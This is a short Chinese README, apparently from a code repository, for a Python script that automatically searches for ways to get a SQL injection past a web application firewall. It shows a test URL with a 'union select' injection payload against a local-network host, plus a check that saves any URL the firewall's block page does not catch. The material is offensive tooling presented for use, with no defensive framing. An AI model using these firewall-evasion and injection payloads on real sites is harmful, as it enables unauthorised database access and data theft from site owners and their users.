# 自动化bypass WAf

此脚本的用途：
- [x] 获取自定义内容的长度，然后根据自定义长度生成代码并执行

关键点说明
```python
self.data=string.digits+'!' #定义内容
self.payload='http://192.168.241.158/sql.php?id=0%20union%20select%201,2' #要测试的url


 if not '网站防火墙' in rqt.text and not 'NULL' in rqt.text: #判断条件
                print(Fore.GREEN+'[+] '+Fore.WHITE+' Bypass Dog url:{}'.format(jg))
                print(jg,file=open('test.txt','a',encoding='utf-8'))
                exit()
```
![](https://s2.ax1x.com/2019/11/15/MUUNcj.md.png)